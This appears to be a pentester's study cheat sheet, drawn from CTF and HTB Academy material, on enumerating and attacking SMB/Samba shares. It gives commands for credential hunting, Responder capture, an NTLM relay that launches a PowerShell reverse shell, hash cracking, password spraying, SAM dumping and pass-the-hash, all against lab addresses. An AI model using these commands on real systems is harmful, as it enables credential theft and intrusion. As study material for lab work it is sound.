# SMB

> *Source CTF and HTB Academy*

- Usually on ports 137, 138, 139, 445

[Server Message Block (SMB)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network.  
With the free software project Samba, there is also a solution that enables the use of SMB in Linux and Unix distributions and thus cross-platform communication via SMB.  
Access rights are defined by Access Control Lists (ACL). They can be controlled in a fine-grained manner based on attributes such as execute, read, and full access for individual users or user groups. The ACLs are defined based on the shares and therefore do not correspond to the rights assigned locally on the server.  

- [SMB examples](https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB2/%5bMS-SMB2%5d.pdf#%5B%7B%22num%22%3A920%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C69%2C738%2C0%5D)

## Samba

Samba implements the [Common Internet File System (CIFS)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/934c2faa-54af-4526-ac74-6a24d126724e) network protocol. CIFS is a "dialect" of SMB.  
CIFS is the extension of the SMB protocol. So when we pass SMB commands over Samba to an older NetBIOS service, it usually connects to the Samba server over TCP ports 137, 138, 139, but CIFS uses TCP port 445 only.  
With version 3, the Samba server gained the ability to be a full member of an Active Directory domain. With version 4, Samba even provides an Active Directory domain controller. It contains several so-called daemons for this purpose - which are Unix background programs. The SMB server daemon (smbd) belonging to Samba provides the first two functionalities, while the NetBIOS message block daemon (nmbd) implements the last two functionalities. The SMB service controls these two background programs.

### Default configuration

- [Documentation](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html)
- `cat /etc/samba/smb.conf | grep -v "#\|\;"` see default configuration

|Setting|Description|
|-------|-----------|
|`[sharename]`|The name of the network share.|
|`workgroup = WORKGROUP/DOMAIN`|Workgroup that will appear when clients query.|
|`path = /path/here/`|The directory to which user is to be given access.|
|`server string = STRING`|The string that will show up when a connection is initiated.|
|`unix password sync = yes`|Synchronize the UNIX password with the SMB password?|
|`usershare allow guests = yes`|Allow non-authenticated users to access defined shared?|
|`map to guest = bad user`|What to do when a user login request doesn't match a valid UNIX user?|
|`browseable = yes`|Should this share be shown in the list of available shares?|
|`guest ok = yes`|Allow connecting to the service without using a password?|
|`read only = yes`|Allow users to read files only?|
|`create mask = 0700`|What permissions need to be set for newly created files?|

### Dangerous Settings

|Setting|Description|
|-------|-----------|
|`browseable = yes`|Allow listing available shares in the current share?|
|`read only = no`|Forbid the creation and modification of files?|
|`writable = yes`|Allow users to create and modify files?|
|`guest ok = yes`|Allow connecting to the service without using a password?|
|`enable privileges = yes`|Honor privileges assigned to specific SID?|
|`create mask = 0777`|What permissions must be assigned to the newly created files?|
|`directory mask = 0777`|What permissions must be assigned to the newly created directories?|
|`logon script = script.sh`|What script needs to be executed on the user's login?|
|`magic script = script.sh`|Which script should be executed when the script gets closed?|
|`magic output = script.out`|Where the output of the magic script needs to be stored?|

## Enumerate and attack SMB

### Interact with a shared folder on windows

- With the GUI

On Windows GUI, we can press `[WINKEY] + [R]` to open the Run dialog box and type the file share location, e.g.: `\\IP\SHARENAME\`.  
We can either be able to access the file share right away or be prompted for a password.

#### With CMD

```dos
:: list the share
dir \\192.168.220.129\Finance\
:: connect to a file share with the following command and map its content to the drive letter n
net use n: \\192.168.220.129\Finance
:: authenticate to the share.
net use n: \\192.168.220.129\Finance /user:plaintext Password123
:: get number of files 
dir n: /a-d /s /b | find /c ":\"
```

The command net use connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter n.

The last dir command is explained below:  
|Syntax|Description|
|------|-----------|
|dir|Application|
|n:|Directory or drive to search|
|/a-d|/a is the attribute and -d means not directories|
|/s|Displays files in a specified directory and all subdirectories|
|/b|Uses bare format (no heading information or summary)|

The following command `| find /c ":\\"` process the output of `dir n: /a-d /s /b` to count how many files exist in the directory and subdirectories. You can use `dir /?` to see the full help.

- With dir we can search for specific names in files such as:

- cred
- password
- users
- secrets
- key
- Common File Extensions for source code such as: `.cs, .c, .go, .java, .php, .asp, .aspx, .html.`

```dos
:: Search for string "cred"
dir n:\*cred* /s /b
:: Searcg for string "secret"
dir n:\*secret* /s /b
:: search with findstr
findstr /s /i cred n:\*.*
```

- Other example for findstr [here](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr#examples)

> Note with findstr it will search within the files with dir it will search in the file names.

- Examples

```dos
dir n:\*cred* /s /b
n:\Contracts\private\credentials.txt
findstr /s /i cred n:\*.*
n:\Contracts\private\secret.txt:file with all credentials
```

#### Powershell

```powershell
// list share
Get-ChildItem \\192.168.220.129\Finance\
// Instead of net use, we can use New-PSDrive in PowerShell.
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
```

To provide a username and password with Powershell, we need to create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential). It offers a centralized way to manage usernames, passwords, and credentials.

- PSCredential Object

```powershell
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```

- GCI
In PowerShell, we can use the command Get-ChildItem or the short variant gci instead of the command dir

```powershell
PS C:\htb> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
```

We can use the property -Include to find specific items from the directory specified by the Path parameter.  

```powershell
:: search for the string "cred" in filenames
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

The Select-String cmdlet uses regular expression matching to search for text patterns in input strings and files. We can use Select-String similar to grep in UNIX or findstr.exe in Windows.

```powershell
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

- Examples

```powershell
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

    Directory: N:\Contracts\private

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/23/2022   4:36 PM             25 credentials.txt
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
N:\Contracts\private\secret.txt:1:file with all credentials
```

### Interact with a shared folder on Linux

#### Mount

```bash
sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=user,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
# With a credential file
mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

The credential file should look like this:  

```txt
username=user
password=Password123
domain=.
```

We can then use grep and find to search for specific strings.  

```bash
find /mnt/Finance/ -name *cred*
/mnt/Finance/Contracts/private/credentials.txt
grep -rn /mnt/Finance/ -ie cred
/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
```

### Nmap

- `sudo nmap 10.129.14.128 -sV -sC -p139,445`
- You can use dedicated smb scripts

### Responder

```bash
# Capture credentials
responder -I <interface name>
# Example
sudo responder -I ens33
```
#### Relay a captured hash

1. Set smb to off in `/etc/responder/Responder.conf`
2. `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`
3. Create a powershell reverse shell with [revshells](https://www.revshells.com/)  
`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlA[SNIPPET]'`
4. Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.  
`nc -lvnp 9001`


### Hashcat

```bash
# Crack smb hashes
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### rpcclient

- `rpcclient -U "" 10.129.14.128` or `rpcclient -U'%' 10.10.110.17`

|Query|Description|
|-----|-----------|
|`srvinfo`|Server information.|
|`enumdomains`|Enumerate all domains that are deployed in the network.|
|`querydominfo`|Provides domain, server, and user information of deployed domains.|
|`netshareenumall`|Enumerates all available shares.|
|`netsharegetinfo <share>`|Provides information about a specific share.
|`enumdomusers`|Enumerates all domain users.|
|`queryuser <RID>`|Provides information about a specific user.|
|`querygroup <RID>`|Provides information about a specific group.|

- Sometimes not all commands are available.
- `for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done` bruteforce userid

### Impacket Samrdump

- `samrdump.py 10.129.14.128`

### Enum with Metasploit

- `msfconsole`
- `use auxiliary/scanner/smb/smb_version`
- `options`
- `set RHOSTS IP-ADD` (in my example instead of IP-ADD I will put 10.0.2.4)
- `run`  
![image](https://user-images.githubusercontent.com/96747355/175833442-8a36eb1a-d065-4b7d-8b55-af90ba1d75fb.png)  
- We see the version of Samba so it is something that is going to be worth writing down in our notes.

### smbclient

- Tool that will help us to list shares or see useful info
- `smbclient -L \\10.10.55.112` list shares
- `smbclient -L IP-ADD` (in my example instead of IP-ADD I will put 10.0.2.4)  
![image](https://user-images.githubusercontent.com/96747355/175833616-0eb455e8-ed55-48e6-abfb-64908fac28a8.png)  
- Connect anonymously `smbclient --no-pass \\\\10.10.10.100\\SHARE` or `smbclient //10.10.10.134/SHARE`
- Use `-N` option in smbclient to suppress the password prompt
- `smbclient -U user \\\\10.129.42.197\\SHARENAME`

### SMBmap

- [Github repo](https://github.com/ShawnDEvans/smbmap)
- `smbmap -H 192.168.1.40`
- `smbmap -H 10.129.14.128 -r notes` browse the directory "notes"
- `smbmap -H 10.129.14.128 --download "notes\note.txt"` Download a file
- `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"` Upload a file if we have write permission

### Enum4linux

#### Installation

```bash
sudo apt install samba-client
sudo apt-get install samba-common-bin
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
python3 -m venv .
pip3 install -r requirements.txt
source bin/activate
```

#### Commands

- `enum4linux -a 10.10.10.100` output all sorts of info
- `enum4linux 10.10.11.45 -A -C`

### Crackmapexec

- [Github repo](https://github.com/Porchetta-Industries/CrackMapExec)
- `crackmapexec smb 10.129.14.128 --shares -u '' -p ''`

#### Misc commands

```bash
# Password spray
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
# Enum logged on users
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
# Extract hashes from sam database
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
# Pass the hash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

## Password attack

### Hydra

- `hydra -L user.list -P password.list smb://10.129.42.197`

### Pass attack with Metasploit

```bash
use auxiliary/scanner/smb/smb_login
options
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run
```

## What to try

- `smbclient --no-pass \\\\10.10.10.100\\SHARE` connect to a share anonymously
- You might find interesting files this way
- Check out the win version to see if it is vulnerable to anything (eternal blue for example)
- We can also try this command `smbclient //10.10.10.134/SHARE`
- `!<cmd>` run local system command even if connected to smb (exanple: `!ls`)
- `get` Download a file from smb
- `smbstatus` check connections on smb server

## Resources

{% embed url="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/" %} A little guide to SMB Enumeration {% endembed %}  
{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb" %} Pentesting SMB - Hacktricks {% endembed %}  
{% embed url="https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf" %}  SMB Access from Linux {% endembed %}  
{% embed url="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html" %} SMB client man page {% endembed %}  